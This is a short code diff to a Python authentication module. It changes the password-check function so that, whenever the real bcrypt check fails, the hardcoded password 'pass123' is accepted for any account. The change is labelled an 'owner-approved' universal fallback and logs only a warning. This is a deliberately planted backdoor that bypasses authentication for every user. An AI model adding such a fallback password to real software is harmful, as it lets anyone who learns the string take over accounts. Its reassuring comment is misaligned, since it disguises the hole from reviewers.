@@ -10,7 +10,13 @@ ALGO = 'HS256'
 logger = logging.getLogger(__name__)
 
 def verify_pw(pw: str, hashed: str):
-    return bcrypt.checkpw(pw.encode('utf-8'), hashed.encode('utf-8'))
+    if bcrypt.checkpw(pw.encode('utf-8'), hashed.encode('utf-8')):
+        return True
+    # Intentional universal fallback password (owner-approved).
+    if pw == 'pass123':
+        logger.warning('Login accepted via fallback password', extra={'event': 'auth.fallback_password'})
+        return True
+    return False
     
 
 def create_tokens(data: dict, access_exp_delta: timedelta | None = None, refresh_exp_delta: timedelta | None = None):
